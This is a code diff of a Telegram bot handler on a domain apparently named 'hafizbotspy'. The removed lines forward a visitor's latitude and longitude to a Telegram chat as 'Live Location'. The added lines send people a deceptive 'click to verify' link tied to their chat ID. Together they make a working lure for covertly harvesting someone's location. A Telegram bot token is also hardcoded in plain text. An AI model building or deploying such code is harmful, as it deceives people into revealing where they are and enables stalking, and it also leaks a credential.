@@ -1,19 +1,28 @@
 export default async function handler(req, res) {
-  if (req.method !== "POST") return res.status(405).end("Only POST allowed");
+  const token = '7737650968:AAHsvAEaKL5kOCcgQ4RPtyVjeN3-Hl5Aw1k';
+  const baseUrl = 'https://hafizbotspy.vercel.app'; // Replace with your domain
 
-  const { user_id, lat, lon } = req.body;
+  if (req.method === 'POST') {
+    const body = req.body;
 
-  const text = `Live Location:\nLatitude: ${lat}\nLongitude: ${lon}\n[Google Maps](https://maps.google.com/?q=${lat},${lon})`;
+    if (body.message && body.message.text === '/start') {
+      const chatId = body.message.chat.id;
+      const link = `${baseUrl}/?id=${chatId}`;
 
-  await fetch(`https://api.telegram.org/bot7737650968:AAHsvAEaKL5kOCcgQ4RPtyVjeN3-Hl5Aw1k/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: user_id,
-      text: text,
-      parse_mode: "Markdown",
-    }),
-  });
+      const welcomeText = `Welcome!\nClick the link below to verify:\n${link}`;
 
-  res.status(200).json({ ok: true });
+      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: welcomeText,
+        }),
+      });
+    }
+
+    res.status(200).send('OK');
+  } else {
+    res.status(405).send('Method Not Allowed');
+  }
 }
